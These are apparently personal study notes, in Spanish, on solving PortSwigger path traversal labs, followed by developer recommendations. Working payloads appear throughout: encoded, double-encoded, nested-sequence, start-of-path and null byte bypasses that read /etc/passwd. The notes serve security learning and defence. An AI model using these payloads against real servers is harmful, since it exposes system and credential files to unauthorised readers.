

## Recomendaciones para el desarrollador

1. sanitizar o validar la entrada del parametro filename
2. todas las operaciones de la API debe seguir el principio de Least Privilege
3. Uno de los principales riesgos de un path traversal es subir una reverse shell, secuestrar llaves SSH
4. strict validation of user input: Java: getCanonicalPath, PHP: realpath
5. Aunque hay contramedidas para stripear los pattern mas comunes siempre pueden saltarse, favor verificar: https://www.redsentry.com/blog/exploring-the-dangers-of-path-traversal-vulnerabilities-in-web-applications


## Resolucion de los labs de port swigger:

- LAB01: usar un relative path con saltos hacia atras (3 creo)

- LAB02: usar un absolute path

```
- LAB03: este lab tenia medidas de proteccion (strips) pero aca se aprende los distintos bypass:
	- usar ....//....//.....//+el nombre del archivo
	- usar url encoding: filename=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

filename=%u002e%u002e%u002e%u002e%u2215%u2215%u002e%u002e%u002e%u002e%u2215%u2215%u002e%u002e%u002e%u002e%u2215%u2215etc%u2215passwd

```

```
- LAB04: utiliza bloqueadores que se parecen a path traversal, luego ejecuta un URL decode del input antes de usarlo

Explicacion:

The whole **traversal sequences stripped with superfluous URL-decode** means that the input will be decoded using the URL decoding scheme, and if any path traversal sequence is found, that will be stripped away.

Entonces el objetivo es saltarse el decoding:

Mi primer payload fue este:
filename=%252e%252e..%252f%252f%252e%252e..%252f%252f%252e%252e..%252f%252fetc%252f%252fpasswd

Estaba probando un double encoding siguiendo estos caracteres:

. -> %252e
/ -> %252f

entonces empece a probar hasta que encontre el idoneo:
filename=%252e%252e%252f%252f%252e%252e%252f%252f%252e%252e%252fetc%252fpasswd


```

```
- LAB05: validation of start of path, en el enunciado dice:
The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

Este lab lo descifre por mis propios medios, creo que una clave fue que interactue con la forma en como era verificado el start path, una vez lo entendi fue facil encontra la repuesta:

la app siempre espera algo asi:
filename=/var/www/images/etc/passwd

entonces simplemente podia pivotear con moverme hacia donde queria, el payload me quedo asi:
filename=/var/www/images/../../../etc/passwd


```


```
- LAB06: validation of file extension with null byte bypass
The application validates that the supplied filename ends with the expected file extension.

este url fue util:
https://www.radware.com/cyberpedia/application-security/null-byte-injection/

este ejercicio nos introduce a identificar la tecnica del NULL byte injection

payload que funciono:
filename=../../../etc/passwd%00.jpg

mi error fue tratar de bypassear la validacion original:
filename=2%00.jpg

en realidad un archivo llamado 2 no existe por eso me daba error, pero cuando ya decidi probar con el archivo passwd funciono

```